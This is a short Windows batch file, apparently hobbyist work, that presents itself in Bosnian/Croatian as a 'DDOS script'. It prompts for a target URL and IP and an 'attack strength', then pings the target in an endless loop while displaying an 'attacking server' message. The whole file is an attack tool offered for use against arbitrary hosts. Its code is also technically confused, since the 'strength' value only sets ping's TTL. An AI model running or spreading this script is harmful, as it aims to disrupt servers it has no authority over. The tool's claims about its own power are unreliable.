@echo off

mode 67,16
title DDOS SKRIPTA NAPRAVLJENA OD (KENAN HUSAKOVIC)
color 0c
cls
echo.
echo -------------------------------------------
echo Skripta ddosa kreirana od Kenan Husakovic!!
echo -------------------------------------------
echo.
set /p x=URL:
echo.
echo --------------
ping %x%
echo --------------
@ping.exe 127.0.0.1 -n 5 -w 1000 > nul
goto Next
:Next
echo.
echo.
echo.
set /p m=IP:
echo.
set /p n=Jacina napada (Preporuceno 500):
echo.
:DDOS
color 0d
echo Napadanje servera/stranice/hostinga %m%
ping %m% -i %n% -t >nul
goto DDOS